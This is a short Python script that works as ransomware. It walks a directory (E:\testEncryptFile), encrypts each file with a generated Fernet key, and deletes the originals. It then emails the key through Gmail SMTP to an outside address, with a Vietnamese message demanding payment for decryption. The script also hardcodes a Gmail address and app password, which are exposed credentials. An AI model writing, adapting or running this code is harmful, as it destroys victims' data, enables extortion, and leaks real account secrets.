# import required module
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
encryptKey=Fernet.generate_key()

with open('encryptKey.pem', 'wb') as f:
    f.write(encryptKey)
    f.close()
file_dir=[]
def connectGmail():
    src_email="hackerdentutuonglai200@gmail.com"
    des_email='mn.nguyen020@gmail.com'
    s=smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(src_email, 'naxr foex dggq gxjr')
    mess=MIMEMultipart()
    mess['From']=src_email
    mess['To']=des_email
    mess['Subject']='Ma hoa thu muc'
    mess.attach(MIMEText("Thu muc da bi ma hoa:\nhay nap 50k de giai ma:","plain","utf-8"))
    with open('encryptKey.pem', "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header("Content-Disposition", f"attachment; filename= encryptKey.pem")

    # Add attachment to message
    mess.attach(part)
    s.sendmail(src_email, des_email, mess.as_string())
    s.quit()
def list_files(start_path):

    # Walk through directory tree
    for root, dirs, files in os.walk(start_path):
        # Print current directory
        print(f"\nDirectory: {root}")

        # Print all files in current directory
        for file in files:
            # Create full file path
            full_path = os.path.join(root, file)
            file_dir.append(full_path)
def encrypt_files(filename):
    with open("encryptKey.pem","rb") as f:
        key = f.read()
    fernet=Fernet(key)
    with open(filename, "rb") as f:
        data = f.read()
    encrypted_data = fernet.encrypt(data)
    with open(filename+".bimahoa", "wb") as f:
        f.write(encrypted_data)

list_files("E:\\testEncryptFile")
for file in file_dir:
    if file.endswith(".bimahoa"):
        continue
    encrypt_files(file)
    print("Encrypted successfully")
    os.remove(file)

connectGmail()

